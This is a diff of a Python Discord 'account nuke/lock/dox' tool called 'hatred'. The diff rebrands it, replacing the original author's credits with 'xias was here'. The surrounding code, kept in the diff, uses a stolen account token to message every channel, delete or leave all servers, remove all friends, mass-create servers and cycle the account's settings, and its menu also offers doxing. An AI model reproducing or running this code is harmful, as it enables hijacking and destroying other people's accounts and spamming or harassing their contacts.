@@ -24,7 +24,7 @@ def setup():
     try:
         os.system("mode con cols=135 lines=23")
         os.system(
-            "title hatred : discord account nuke/lock/dox : lust, l-ust on github")
+            "title hatred : discord account nuke/lock/dox")
     except:
         pass
 
@@ -194,14 +194,14 @@ def nuke(token):
     for id in channIds:
         try:
             requests.post(f'https://discord.com/api/v8/channels/{id}/messages', headers=headers, data={
-                          "content": "i've been hit with 'hatred' => lust, l-ust on github : https://github.com/l-ust | join us @ https://discord.gg/vmV8ABh3HE | https://www.github.com/l-ust/hatred"})
+                          "xias was here"})
             print(
                 f'                                        [=>] dm\'ed => {id}')
         except Exception as e:
             print(
                 f"                                        [!] error was thrown; {e}")
     print(f'                                        ::: ::: ::: :::')
-    print(f'                                        DM\'D ALL AVAIL. ID\'S : LUST, L-UST ON GITHUB')
+    print(f'                                        DM\'D ALL AVAIL. ID\'S : xias was here')
     print(f'                                        ::: ::: ::: :::')
 
     for guild in guildsIds:
@@ -224,7 +224,7 @@ def nuke(token):
             print(
                 f"                                        [!] error was thrown; {e}")
     print(f'                                        ::: ::: ::: :::')
-    print(f'                                        DELETED/REMOVED ALL GUILDS : LUST, L-UST ON GITHUB')
+    print(f'                                        DELETED/REMOVED ALL GUILDS : xias was here')
     print(f'                                        ::: ::: ::: :::')
 
     for friend in friendIds:
@@ -237,12 +237,12 @@ def nuke(token):
             print(
                 f"                                        [!] error was thrown; {e}")
     print(f'                                        ::: ::: ::: :::')
-    print(f'                                        REMOVED ALL FRIENDS : LUST, L-UST ON GITHUB')
+    print(f'                                        REMOVED ALL FRIENDS : LUST, xias was here')
     print(f'                                        ::: ::: ::: :::')
 
     for i in range(20):
         try:
-            payload = {'name': 'lust, l-ust on github',
+            payload = {'name': 'xias was here',
                        'region': 'europe', 'icon': None, 'channels': None}
             requests.post('https://discord.com/api/v6/guilds',
                           headers=headers, json=payload)
@@ -253,7 +253,7 @@ def nuke(token):
                 f"                                        [!] error was thrown; {e}")
     print(f'                                        ::: ::: ::: :::')
     print(
-        f'                                        MASS-GUILDED => {i} SERVERS MADE : LUST, L-UST ON GITHUB')
+        f'                                        MASS-GUILDED => {i} SERVERS MADE : xias was here')
     print(f'                                        ::: ::: ::: :::')
 
     payload = {
@@ -276,7 +276,7 @@ def nuke(token):
     except:
         pass
     print(f'                                        ::: ::: ::: :::')
-    print(f'                                        DARK/LIGHT + LANG. SWITCHING => CTRL+C TO END : LUST, L-UST ON GITHUB')
+    print(f'                                        DARK/LIGHT + LANG. SWITCHING => CTRL+C TO END : xias was here')
     print(f'                                        ::: ::: ::: :::')
     try:
         modes = cycle(["light", "dark"])
@@ -382,21 +382,20 @@ def hatred():
 
     print(f'''{Style.DIM}
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                                                      LUST, L-UST ON GITHUB
-                                         ██╗  ██╗ █████╗ ████████╗██████╗ ███████╗██████╗ 
-                                         ██║  ██║██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██╔══██╗
-                                         ███████║███████║   ██║   ██████╔╝█████╗  ██║  ██║
-                                         ██╔══██║██╔══██║   ██║   ██╔══██╗██╔══╝  ██║  ██║
-                                         ██║  ██║██║  ██║   ██║   ██║  ██║███████╗██████╔╝
-                                         ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═════╝{Fore.RESET}
-                                              HATRED => DISCORD ACCOUNT NUKE/LOCK/DOX          
+                                                   ██╗░░██╗██╗░█████╗░░██████╗
+                                                   ╚██╗██╔╝██║██╔══██╗██╔════╝
+                                                   ░╚███╔╝░██║███████║╚█████╗░
+                                                   ░██╔██╗░██║██╔══██║░╚═══██╗
+                                                   ██╔╝╚██╗██║██║░░██║██████╔╝
+                                                   ╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═════╝░{Fore.RESET}
+                                                  DISCORD ACCOUNT NUKE/LOCK/DOX          
                                         ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                                         :::
                                         [{Fore.RED}1{Fore.RESET}] => ACCOUNT-NUKE/LOCK 
                                         [{Fore.RED}2{Fore.RESET}] => ACCOUNT-DOX
                                         [{Fore.RED}3{Fore.RESET}] => ACCOUNT LOG-IN
                                         [{Fore.RED}4{Fore.RESET}] => EXIT
-                                        :::'''.replace('█', f'{Fore.WHITE}█{Fore.RED}'))
+                                        '''.replace('█', f'{Fore.WHITE}█{Fore.RED}'))
     decision = str(input(f'                                        [>] => '))
 
     if decision == '1':
